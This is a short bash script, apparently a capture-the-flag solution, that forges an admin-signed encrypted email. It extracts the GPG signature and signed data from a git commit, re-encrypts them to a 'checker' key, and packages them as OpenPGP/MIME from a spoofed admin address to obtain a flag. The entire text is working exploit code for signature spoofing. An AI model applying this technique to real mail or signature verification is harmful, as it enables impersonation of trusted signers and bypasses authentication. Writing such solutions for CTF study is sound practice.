#!/bin/bash

# create homedir so we do not pollute our gpg keychain
HOMEDIR="/tmp/$(openssl rand -hex 12)"
mkdir -p $HOMEDIR
chmod 700 $HOMEDIR

# import the public key
gpg  --homedir $HOMEDIR --import public/keys/checker.pk
gpg  --homedir $HOMEDIR --import public/keys/admin.pk


# cd to the public folder with .git folder
cd public/

# get the signed admin commit from the git folder
export GNUPGHOME=$HOMEDIR
git cat-file commit HEAD | sed -e 's/^ //'| sed -e 's/gpgsig //' | gpg --dearmor > /tmp/signature.bin
git verify-commit -v HEAD | gpg -z0 --store > /tmp/plaintext.bin

cd ..

# encrypt it with the checker public key
cat /tmp/signature.bin /tmp/plaintext.bin | gpg -r checker@pushgainpull.club --no-literal --encrypt --armor --trust-model always > /tmp/spoofed-mime.txt

# create the mail
cat << EOF > /tmp/spoofed.eml
From: admin <admin@pushgainpull.club>
To: Checker <checker@pushgainpull.club>
Subject: Gib doch Flag
MIME-Version: 1.0
Content-Type: multipart/encrypted;
 protocol="application/pgp-encrypted";
 boundary="XXX"

This is an OpenPGP/MIME encrypted message.
--XXX
Content-Type: application/pgp-encrypted

Version: 1

--XXX
Content-Type: application/octet-stream; name="encrypted.asc"
Content-Disposition: inline; filename="encrypted.asc"

EOF

cat /tmp/spoofed-mime.txt >> /tmp/spoofed.eml
cat <<EOF >> /tmp/spoofed.eml

--XXX--
EOF

cp /tmp/spoofed.eml spoofed.eml 

